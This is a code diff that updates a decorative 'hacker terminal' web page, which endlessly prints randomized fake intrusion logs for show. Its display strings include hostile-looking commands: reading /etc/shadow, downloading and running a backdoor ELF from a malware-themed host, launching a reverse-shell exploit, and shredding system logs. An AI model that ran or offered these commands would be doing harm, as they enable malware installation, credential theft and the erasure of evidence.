@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL - OVERRIDE MULTIPLEXER</title>
+    <title>AUTO MATRIX TERMINAL - OVERRIDE V2.0</title>
     <style>
         body {
-            background-color: #050505; /* 深黑底色 */
+            background-color: #020202; /* 極致深黑 */
             color: #39ff14; /* 螢光霓虹綠 */
             font-family: 'Courier New', Courier, monospace;
             font-size: 16px;
-            line-height: 1.4;
+            line-height: 1.5;
             margin: 0;
-            padding: 30px;
+            padding: 25px;
             overflow: hidden;
             height: 100vh;
-            /* 螢幕微發光與掃描線特效 */
-            text-shadow: 0 0 5px rgba(57, 255, 20, 0.7);
-            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            background-size: 100% 4px, 6px 100%;
+            /* 經典 CRT 螢幕發光特效 */
+            text-shadow: 0 0 4px rgba(57, 255, 20, 0.7);
+            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
+            background-size: 100% 4px;
         }
 
         #container {
@@ -29,26 +29,34 @@
             word-wrap: break-word;
         }
 
-        /* 成功指令的特別顏色 */
+        /* 成功/通過狀態 */
         .status-ok {
             color: #00ffcc;
             font-weight: bold;
             text-shadow: 0 0 8px rgba(0, 255, 204, 0.9);
         }
 
-        /* 警告或核心動作 */
+        /* 警告/正在執行狀態 */
         .status-action {
             color: #ffff00;
+            text-shadow: 0 0 6px rgba(255, 255, 0, 0.8);
         }
 
-        /* 模擬游標 */
+        /* 關鍵危險指令 */
+        .status-alert {
+            color: #ff3333;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.9);
+        }
+
+        /* 模擬閃爍游標 */
         #cursor {
             display: inline-block;
             width: 10px;
             height: 1.2em;
             background-color: #39ff14;
             vertical-align: bottom;
-            animation: blink 0.8s infinite;
+            animation: blink 0.6s infinite;
             box-shadow: 0 0 8px #39ff14;
         }
 
@@ -57,7 +65,7 @@
             50.1%, 100% { opacity: 0; }
         }
 
-        /* 隱藏捲軸但保留功能 */
+        /* 隱藏右側原生滾動條 */
         ::-webkit-scrollbar {
             width: 0px;
             background: transparent;
@@ -68,82 +76,72 @@
     <div id="container"><span id="output"></span><span id="cursor"></span></div>
 
     <script>
-        // 裝逼指令庫：包含程式碼、指令、成功訊息、進度條
-        const commands = [
-            "root@kali:~# nmap -sS -A -v 192.168.1.254\n",
-            "Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-19 13:32 UTC\n",
-            "Initiating ARP Ping Scan at 13:32...\n",
-            "Scanning 192.168.1.254 [1 port]\n",
-            "<span class='status-ok'>[OK] DISCOVERED OPEN PORT: 22 (SSH)</span>\n",
-            "<span class='status-ok'>[OK] DISCOVERED OPEN PORT: 80 (HTTP)</span>\n",
-            "<span class='status-ok'>[OK] DISCOVERED OPEN PORT: 443 (HTTPS)</span>\n",
-            "root@kali:~# ./exploit_payload --target 192.168.1.254 --port 22\n",
-            "<span class='status-action'>[SYSTEM] INITIATING BUFFER OVERFLOW ATTACK...</span>\n",
-            "Sending crafted payload (1024 bytes) [■■■■■■■■■■■■■■■■] 100%\n",
-            "Stack pointer intercepted at 0x7FFF1234\n",
-            "Overwriting return address with NOP sled...\n",
-            "<span class='status-ok'>[SUCCESS] VULNERABILITY EXPLOITED. INJECTING SHELLCODE...</span>\n",
-            "root@kali:~# establish_connection --secure-tunnel --bypass-firewall\n",
-            "Allocating virtual socket memory... Done.\n",
-            "Bypassing AWS WAF Cloud Shield... [ATTEMPT 1] -> <span class='status-ok'>PASSED</span>\n",
-            "Tunneling through proxy: 128.23.45.12 -> 88.211.4.9\n",
-            "<span class='status-ok'>[CONNECTION] BACKDOOR ESTABLISHED AT PORT 4444</span>\n",
-            "root@kali:~# cat /etc/shadow | grep admin\n",
-            "admin:$6$aS81ndH9$vXo91m... [HASH FOUND]\n",
-            "<span class='status-action'>[DECRYPTING] RUNNING BRUTE-FORCE ON SHA-512 HASH...</span>\n",
-            "Searching matrix dictionary... [ 15,400,000 keys/sec ]\n",
-            "Progress: [■■■■□□□□□□□□□□□□] 25%\n",
-            "Progress: [■■■■■■■■■■□□□□□□] 62%\n",
-            "Progress: [■■■■■■■■■■■■■■■■] 100%\n",
-            "<span class='status-ok'>[OK] DECRYPTION SUCCESSFUL! PLAIN TEXT: 'P@ssw0rd2026!'</span>\n",
-            "root@kali:~# ssh admin@192.168.1.254\n",
-            "Warning: Permanently added '192.168.1.254' (RSA) to the list of known hosts.\n",
-            "Password: *************\n",
-            "<span class='status-ok'>[ACCESS GRANTED] WELCOME TO THE CORE MAINFRAME.</span>\n",
-            "--------------------------------------------------\n",
-            "INITIALIZING FILE SYSTEM INFILTRATION...\n",
-            "Downloading database backups... [■■■■■■■■■■■■■■■■] 100% (4.2GB)\n",
-            "<span class='status-ok'>[OK] DATA EXTRACTION COMPLETE. ERASING LOGS TO PREVENT DETECTION...</span>\n",
-            "Shredding /var/log/auth.log... <span class='status-ok'>DONE</span>\n",
-            "Shredding /var/log/syslog... <span class='status-ok'>DONE</span>\n",
-            "<span class='status-action'>[STATUS] TERMINAL CLEAN. EXITING COMPROMISED NODE.</span>\n\n"
+        // 核心黑客指令池
+        const logTemplates = [
+            () => `root@kali-arc:~# nmap -sV -T4 -p- 10.0.${rand(255)}.${rand(255)}\n`,
+            () => `Scanning network vector... <span class='status-action'>[SEARCHING OPEN PORTS]</span>\n`,
+            () => `Discovered service on port ${rand(9000)}: <span class='status-ok'>HTTP Apache/2.4.41 (Ubuntu)</span>\n`,
+            () => `root@kali-arc:~# ./exploit_v${rand(9)} --target 172.16.${rand(100)}.4 --payload=reverse_tcp\n`,
+            () => `<span class='status-action'>[ATTEMPT] Injecting buffer overflow payload at memory stack: 0x${randHex(8)}</span>\n`,
+            () => `Stack pointer offset: ${rand(1024)} bytes -> <span class='status-ok'>[ALIGNED]</span>\n`,
+            () => `Progress: [${"■".repeat(rand(6)+10)}${"□".repeat(6)}] 74%... Loading Binaries\n`,
+            () => `Progress: [■■■■■■■■■■■■■■■■] 100% -> <span class='status-ok'>[SUCCESS]</span>\n`,
+            () => `<span class='status-ok'>[OK] EXPLOIT SUCCESSFUL. SPAWNING ROOT SHELL ON SUBNET...</span>\n`,
+            () => `root@target-server:/# cat /etc/passwd | grep -E "admin|root"\n`,
+            () => `Found matching hash: <span class='status-action'>$6$zQ9X${randHex(12)}...</span>\n`,
+            () => `Launching multi-threaded brute force dictionary attack [Threads: 64]\n`,
+            () => `Testing speed: ${rand(50)+50},421 keys/sec... \n`,
+            () => `<span class='status-ok'>[SUCCESS] PASSWORD CRACKED: "admin_master_${rand(9999)}!"</span>\n`,
+            () => `root@target-server:/# wget http://malware-vault.net/payload/backdoor.elf\n`,
+            () => `Connecting to malware-vault.net... <span class='status-ok'>CONNECTED.</span> Sending request.\n`,
+            () => `Length: 4,194,304 (4.0M) [application/x-executable]\n`,
+            () => `Saving to: 'backdoor.elf' [■■■■■■■■■■■■■■■■] 100% \n`,
+            () => `root@target-server:/# chmod +x backdoor.elf && ./backdoor.elf --daemon\n`,
+            () => `<span class='status-ok'>[CONNECTION] BACKDOOR ESTABLISHED BACK TO IP: 192.168.1.150:4444</span>\n`,
+            () => `<span class='status-alert'>[WARNING] FIREWALL INTRUSION DETECTION SYSTEM TRIGGERED!</span>\n`,
+            () => `<span class='status-action'>[BYPASS] Executing log scrub protocol (shred /var/log/secure)...</span>\n`,
+            () => `Deleting footprints... <span class='status-ok'>[CLEAN] 234 log entries zeroed out.</span>\n`,
+            () => `root@kali-arc:~# ssh-keygen -f "/root/.ssh/known_hosts" -R "10.0.1.50"\n`,
+            () => `-----------------------------------------------------------\n`,
+            () => `<span class='status-ok'>[SYSTEM STATUS] TARGET MAIN CORE SUCCESSFULLY COMPROMISED.</span>\n`,
+            () => `-----------------------------------------------------------\n`
         ];
+
+        // 輔助工具：隨機數字與十六進位（讓資料看起來每次都不同）
+        function rand(max) { return Math.floor(Math.random() * max); }
+        function randHex(len) {
+            const chars = '0123456789ABCDEF';
+            let result = '';
+            for (let i = 0; i < len; i++) result += chars[rand(16)];
+            return result;
+        }
 
         const outputSpan = document.getElementById('output');
         const container = document.getElementById('container');
-        let cmdIndex = 0;
+        
+        let templateIndex = 0;
 
-        function triggerNextLine() {
-            if (cmdIndex < commands.length) {
-                // 直接噴出一整條帥氣指令或狀態
-                outputSpan.innerHTML += commands[cmdIndex];
-                cmdIndex++;
+        function autoType() {
+            // 從池子裡拿出一行指令模板並生成
+            const nextLine = logTemplates[templateIndex]();
+            outputSpan.innerHTML += nextLine;
+            
+            // 指令索引遞增，到尾端就歸零無限循環
+            templateIndex = (templateIndex + 1) % logTemplates.length;
 
-                // 自動滾動到底部
-                container.scrollTop = container.scrollHeight;
+            // 超極限自動滾動到底部
+            container.scrollTop = container.scrollHeight;
 
-                // 隨機控制下一條指令出現的時間（50ms ~ 300ms），製造真人瘋狂操作的節奏感
-                const nextDelay = Math.random() * 250 + 50;
-                setTimeout(triggerNextLine, nextDelay);
-            } else {
-                // 全部跑完後，隔兩秒清空重來
-                setTimeout(() => {
-                    cmdIndex = 0;
-                    outputSpan.innerHTML = "<span class='status-action'>[SYSTEM] RESETTING TERMINAL MULTIPLEXER...</span>\n\n";
-                    triggerNextLine();
-                }, 2000);
-            }
+            // 超快速推進：隨機 30 毫秒 到 120 毫秒跑出一條，速度感極強
+            const fastSpeed = Math.random() * 90 + 30;
+            setTimeout(autoType, fastSpeed);
         }
 
-        // 監聽鍵盤事件：只要使用者在鍵盤上「隨便亂敲」，就會觸發指令噴出！
-        // 如果手放開不敲，它也會自動以固定速度慢慢跑，確保裝逼不中斷。
-        window.addEventListener('keydown', (e) => {
-            e.preventDefault(); // 防止按鍵原生功能（如空白鍵捲動網頁）
-            triggerNextLine();
-        });
-
-        // 初始自動啟動一次，引導畫面
-        setTimeout(triggerNextLine, 500);
+        // 網頁載入後，直接全自動瘋狂推進
+        window.onload = () => {
+            outputSpan.innerHTML = "<span class='status-action'>[SYSTEM] INITIALIZING AUTO-PILOT INFILTRATION MULTIPLEXER...</span>\n\n";
+            setTimeout(autoType, 800);
+        };
     </script>
 </body>
 </html>
